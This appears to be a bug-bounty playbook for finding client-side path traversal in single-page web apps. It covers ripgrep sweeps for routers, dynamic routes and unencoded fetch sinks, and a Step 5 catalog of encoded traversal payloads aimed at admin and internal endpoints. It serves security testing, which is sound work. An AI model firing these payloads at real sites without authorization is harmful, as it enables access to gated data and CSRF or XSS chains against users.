# CSPT discovery — from the collected JS to the confirmed divergence

## Contents

- Step 1 — fingerprint the router (and PIN THE VERSION)
- Step 2 — enumerate dynamic routes (splat/catch-all = priority)
- Step 3 — find the param → fetch interpolation (the sink)
- Step 4 — list same-origin pivot targets (CSPT is same-origin only)
- Step 5 — test the payload catalog (Caido / DevTools Network tab open)
- False positives (kill the candidate here, before promoting)

Run these against the bundles js-source-to-sink already handed you in
`targets/<program>/js/` (beautified JS, Webpack/Vite chunks, `.map` source maps).
Source maps are decisive — every `path:` declaration and the raw router config
are reconstructable verbatim; prefer `.map`-reconstructed source when present.

**rg guard** (a silent grep failure reads as "clean" = false negatives): resolve
the binary once — `rg=$(command -v rg || echo /run/host/usr/bin/rg)` — and after
any 0-hit sweep confirm rg ran with a known-positive control
(`"$rg" -c fetch <file>`). A 0 from a broken rg is not a real negative.

## Step 1 — fingerprint the router (and PIN THE VERSION)

```bash
cd targets/<program>/js
rg -l 'react-router|useParams|useLocation|useSearchParams'   # React Router
rg -l 'vue-router|useRoute|route\.params'                     # Vue Router
rg -l '@angular/router|paramMap|ActivatedRoute'               # Angular
rg -l '_next/|__NEXT_DATA__'                                   # Next.js
rg -l 'nuxt|__NUXT__|defineEventHandler|getRouterParam'       # Nuxt (+ server)
rg -l '\$app/stores|\+page\.svelte|\+server'                  # SvelteKit (+ server)
rg -l '@solidjs/router'                                        # Solid / SolidStart
rg -l 'ember-router|@ember/routing'                            # Ember
```

Then pin the version — the `decoding-matrix.md` row depends on it. Look in
webpack/Vite chunk comments, a `package.json` fragment inside a `.map`, or the
vendor chunk banner. Record `framework + version` in `notes/cspt-routes.md`.

## Step 2 — enumerate dynamic routes (splat/catch-all = priority)

```bash
rg -o --no-filename 'path:\s*["\x27][^"\x27]+["\x27]' . | sort -u                    # React/Vue/Angular route defs
rg -o --no-filename '<Route\s+[^>]*path=["\x27][^"\x27]+["\x27]' . | sort -u         # React Router JSX
rg -o --no-filename 'path:\s*["\x27]/[^"\x27]+:[^"\x27]+["\x27]' . | sort -u         # dynamic :param routes
rg -o --no-filename '["\x27][^"\x27]*\*[^"\x27]*["\x27]' . | sort -u                 # splat  (React path="x/*", Vue (.*)*)
rg -o --no-filename '\[\.\.\.[^\]]+\]' . | sort -u                                    # Next/Nuxt/SvelteKit catch-all [...path]
rg -o --no-filename '\[[^\]]+\]' *.map 2>/dev/null | sort -u                         # file-based routes in source maps
```

Save to `notes/cspt-routes.md`. **Mark splat/catch-all routes as priority** —
they take literal `../` with no encoding (`chains.md` §6) and are the easiest to
confirm.

## Step 3 — find the param → fetch interpolation (the sink)

The vulnerable pattern is **route param / query / hash → template literal (or
concat) → `fetch`/axios/XHR**, *without* `encodeURIComponent`.

```bash
# fetch/axios/XHR whose URL is built from a variable (template literal or +concat)
rg -oUN --no-ignore -P '(?s)(fetch|axios|\.(get|post|put|delete|patch|request))\(\s*[`"\x27][^`"\x27]*[$+][^)]{0,80}' . | head -80
rg -B2 -A2 'fetch\(`[^`]*\$\{(userId|productId|orderId|accountId|id|slug|path|file|.*Param.*)\}' .

# React Router: useParams destructure then fetch
rg -B2 -A5 'const\s+\{[^}]+\}\s*=\s*useParams' . | rg -A3 'fetch\(|axios'
rg -B1 -A5 'useSearchParams' . | rg -A3 'fetch\(|axios'          # query-driven (Solid/React)
# Vue: route.params
rg -B1 -A5 'route\.params\.' . | rg -A3 'fetch\(|axios'
# Angular: paramMap.get
rg -B1 -A5 'paramMap\.get' . | rg -A3 'http\.\w+'
# Hash-driven (chains.md §5)
rg -B1 -A5 'location\.hash|hashchange' . | rg -A3 'fetch\(|axios'
# Hybrid SERVER handlers (chains.md §4 — critical)
rg 'getRouterParam.*decode.*true' .                               # Nuxt opt-in decode
rg 'await\s+params' . -A3 | rg 'fetch\('                          # Next route handler / SvelteKit +server
rg -B1 -A3 'defineEventHandler|\+server' . | rg 'fetch\(|\$fetch'
```

**Kill the false positive early:** for each candidate, grep the surrounding lines
for `encodeURIComponent(<param>)` — if the param is re-encoded before
interpolation, that route is safe; move on.

Record each surviving hit in `notes/cspt-leads.md`:

```
File:         main.abc123.js (offset 48127)  |  or sourcemaps/.../Profile.tsx:42
Route:        /users/:userId
Param read:   useParams().userId            (or route.params / paramMap.get / location.hash)
Sink:         fetch(`/api/users/${userId}/profile`)   method=GET  credentials=cookie
Encoded?:     no encodeURIComponent — router decodes %2f (React Router, v6.22)
Chain:        §1 guard bypass / §3 CSPT2CSRF (if POST) / §4 (if server handler)
Priority:     high
```

## Step 4 — list same-origin pivot targets (CSPT is same-origin only)

CSPT cannot dial another domain — the fetch resolves against the SPA's origin.
Candidate destinations (from js-source-to-sink's endpoint inventory):

- Admin/staff/export/impersonate endpoints found in the JS but not gated
  server-side.
- Weaker API versions: `/api/v1`, `/api/legacy`, `/internal`.
- Endpoints that echo input into an HTML response (XSS fuel for `chains.md` §2).
- Server-side fetch proxies / route handlers (→ internal services, `chains.md`
  §4).
- Endpoints returning HTML/SVG (sink fuel).

## Step 5 — test the payload catalog (Caido / DevTools Network tab open)

For each `(route, sink)` pair, in order of likelihood:

```
# Path param
/users/..%2f..%2fadmin%2fusers
/users/%2E%2E%2F%2E%2E%2Fadmin%2Fusers
/users/..%252F..%252Fadmin%252Fusers        # React Router double-encode bypass (Issue #10814) ONLY — UPPERCASE %252F; %252f does not decode
/users/..%c0%af..%c0%afadmin%2fusers         # overlong UTF-8, rare
/files/../../admin/users                     # splat / catch-all only — no encoding
# Suffix truncation — try these on EVERY path-param payload above
/users/..%2f..%2fadmin%2fusers%23
/users/..%2f..%2fadmin%2fusers%3f
/users/..%2f..%2fadmin%2fusers%253f
# Query
?widget=..%2f..%2fattachments%2fmalicious
?next=..%2f..%2fapi%2fv1%2fadmin
# Hash (log-invisible)
#..%2f..%2fadmin
#/route/..%2f..%2fadmin
```

For each payload, capture:
- **Initial URL** (browser bar) — has the encoded payload.
- **Outbound fetch URL** (Network tab, *after* browser normalization) — the
  traversed endpoint. **This divergence is the PoC.**
- Response status + endpoint actually hit.
- Whether the response is rendered / fed to a sink / returns gated data.

Screenshot the SPA URL bar and the resolved Network entry together. Save the
Caido session id. **If you cannot screenshot the divergence, do not report** —
speculation is not a finding.

## False positives (kill the candidate here, before promoting)

- **404 on the traversed request** → **this is usually NOT a negative.** The most common
  cause is the template suffix still riding along (`/admin/users/profile`), not a safe
  framework. Re-fire with `%23` and `%3f` truncation (Step 5) before killing the candidate.
  Only when the plain, `%23`, and `%3f` forms all 404 identically — AND the Network tab shows
  the payload re-encoded rather than traversed — did the framework win. Not a finding then.
- **Response identical to the original endpoint** → the traversal collapsed back
  (`/api/users/../users/me` → `/api/users/me`). Not exploitable.
- **CSPT lands on 401/403** → server-side authz held. Not a finding unless a
  different traversal target bypasses authz.
- **`encodeURIComponent(param)` wraps the value** → re-encoded, defeats CSPT.
- **`new URL("../../admin", base)`** → resolves at construction, not fetch time.
  Verify the *actual* outbound string in the Network tab, not the source template.
- **Catch-all matches but `..` is stripped server-side** → confirm with a unique
  sentinel endpoint you control on the same origin before claiming the traversal.
- **Self-XSS via CSPT** → not a finding unless escalated to another user.

Promote a candidate from `notes/` to `leads/` only when the divergence is
screenshotted AND the traversed endpoint returns gated data / feeds a sink /
reaches an internal service. Gate any High/Critical with `validation` before a
report.
